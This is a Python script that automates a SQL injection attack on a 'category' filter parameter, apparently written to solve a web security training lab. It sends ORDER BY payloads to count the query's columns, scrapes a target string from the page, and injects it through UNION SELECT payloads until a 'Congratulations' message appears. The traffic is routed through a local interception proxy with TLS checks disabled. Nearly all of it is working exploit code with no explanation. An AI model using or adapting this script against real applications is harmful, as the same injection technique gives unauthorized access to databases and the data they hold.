import argparse
import urllib3
import time
import logging
import re

import requests
from bs4 import BeautifulSoup



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEADERS = {
    "X-Pwnfox-Color":"yellow"
}

PROXIES = {
    "http": "127.0.0.1:8080",
    "https":"127.0.0.1:8080"
}

log = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def find_columns(url,no_proxy):

    log.info("finding columns...")


    if not no_proxy:
        i = 1
        while True:
            resp = requests.get(url+f"filter?category=As' order by {i}--",headers=HEADERS,proxies=PROXIES,verify=False)
            if resp.status_code == 500:
                return i-1
            i+=1
    else:
        i = 1
        while True:
            resp = requests.get(url+f"filter?category=As' order by {i}--",headers=HEADERS)
            if resp.status_code == 500:
                return i-1
            i+=1

def string_to_extract(url,no_proxy):

    if not no_proxy:
        resp = requests.get(url,headers=HEADERS,proxies=PROXIES,verify=False)
    else:
        resp = requests.get(url,headers=HEADERS)

    soup = BeautifulSoup(resp.text, "html.parser")
    p = soup.find("p", id="hint").get_text()

    match = re.search(r"'([^']+)'", p)
    if match:
        extracted = match.group(1)
        return extracted


def string_exploit(url,no_proxy,string):

    for i in range(1,4):
        x,y,z = "null","null","null"
        if i==1:
            x = f"'{string}'"
        if i==2:
            y = f"'{string}'"
        if i==3:
            z = f"'{string}'"

        if not no_proxy:
            r = requests.get(url+f"filter?category=s' union select {x},{y},{z} -- ",headers=HEADERS,proxies=PROXIES,verify=False)
        else:
            r = requests.get(url+f"filter?category=s' union select {x},{y},{z} -- ",headers=HEADERS)

        if r.status_code == 200:
            log.info("possibly exploited... checking")
            time.sleep(2)
            if not no_proxy:
                r = requests.get(url,headers=HEADERS,proxies=PROXIES,verify=False)
            else:
                r = requests.get(url,headers=HEADERS)

            if "Congratulations" in r.text:
                log.info(" ✅ exploited successfully")
                return 0


def exploit(url:str, no_proxy:bool):

    cols = find_columns(url,no_proxy)
    log.info(f"[+] found columns: {cols}")

    string = string_to_extract(url,no_proxy)
    log.info(f"[+] extracted string to display: {string}")
    string_exploit(url,no_proxy,string)

def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-n", "--no-proxy", help="to not use any proxy", default=False, action="store_true")
    parser.add_argument("url", help="vulnerable url")
    return parser.parse_args()

def normalize_url(url: str):
    if not url.endswith("/"):
        url = url + "/"
        return url
    return url

if __name__ == "__main__":
    args = parse()
    exploit(normalize_url(args.url),args.no_proxy)

